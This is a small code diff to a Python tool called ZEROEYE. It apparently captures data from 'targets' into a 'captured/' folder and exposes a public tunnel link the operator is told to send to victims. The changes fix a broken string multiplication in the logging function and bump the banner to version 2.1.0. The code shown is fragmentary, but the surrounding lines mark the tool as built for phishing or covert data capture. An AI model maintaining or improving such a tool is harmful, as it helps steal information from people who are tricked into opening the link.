@@ -91,7 +91,7 @@ def save_local(filename, data):
     try:
         timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
         with open(f"captured/{filename}", "a", encoding='utf-8') as f:
-            f.write(f"\n{'='*60}\nTimestamp: {timestamp}\n{'='=60}\n{data}\n\n")
+            f.write(f"\n{'='*60}\nTimestamp: {timestamp}\n{'='*60}\n{data}\n\n")  # FIXED: Changed {'='=60} to {'='*60}
     except:
         pass
 
@@ -237,7 +237,7 @@ def start_wizard():
     url = tunnel_manager.start_tunnel()
     
     console.print(Panel(
-        f"[bold cyan]🚀 ZEROEYE READY[/bold cyan]\n\n"
+        f"[bold cyan]🚀 ZEROEYE v2.1.0 READY[/bold cyan]\n\n"
         f"[bold green]{url}[/bold green]\n\n"
         f"[yellow]📋 Send this link to your target[/yellow]\n"
         f"[green]✅ Worldwide tunnel active[/green]\n"
@@ -257,4 +257,3 @@ def start_wizard():
 
 if __name__ == "__main__":
     start_wizard()
-
